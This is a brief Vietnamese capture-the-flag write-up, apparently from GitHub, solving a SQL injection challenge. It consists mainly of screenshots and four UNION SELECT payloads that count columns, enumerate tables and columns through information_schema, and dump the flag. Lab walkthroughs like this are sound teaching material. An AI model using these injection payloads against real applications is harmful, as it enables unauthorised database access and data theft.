![image](https://github.com/user-attachments/assets/b6654d7c-14d4-4d03-8b58-68fe33057090)

Đây là 1 bài SQLi

![image](https://github.com/user-attachments/assets/04b07dc5-1294-4abd-8f0f-14cbc5f2ebd2)

Dùng payload `aaaaa' UNION SELECT 1,2,3,4,5 -- -` thì thấy có thể dùng 5 cột:

![image](https://github.com/user-attachments/assets/1e64336f-f244-4923-b80a-8cccb6aba65c)

Dùng `aaaaa' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables -- -` thì có 1 bảng tên là flag:

![image](https://github.com/user-attachments/assets/c18da7ce-73fc-41c7-8d51-da117f521e6b)

Dùng `aaaaa' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_name = 'flag' -- -` thì thấy trong bảng flag có cột flag:

![image](https://github.com/user-attachments/assets/40f3efed-d266-4b96-a8a9-ea094dbe4efd)

Dùng `aaaaa' UNION SELECT flag,1,2,3,4 FROM flag -- -` để ra flag:

![image](https://github.com/user-attachments/assets/862936b0-a96a-4a6d-b406-066318f0dcca)





















